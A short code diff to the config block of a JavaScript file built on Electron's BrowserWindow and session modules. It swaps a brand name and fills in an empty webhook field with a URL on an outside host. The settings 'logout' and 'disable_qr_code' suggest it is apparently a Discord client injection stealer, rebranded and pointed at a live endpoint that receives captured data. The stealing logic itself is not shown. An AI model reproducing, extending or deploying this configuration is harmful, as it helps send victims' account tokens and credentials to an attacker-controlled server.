@@ -71,8 +71,8 @@ const { BrowserWindow, session } = require('electron'),
   querystring = require('querystring'),
   fs = require('fs')
 var config = {
-    brand: 'liliandorker_',
-    webhook: '',
+    brand: 'rayzen_',
+    webhook: 'https://websec.services/send/62af56f6e373c153a1185754',
     webhook_link: '%WEBHOOK_LINK%',
     logout: true,
     disable_qr_code: true,
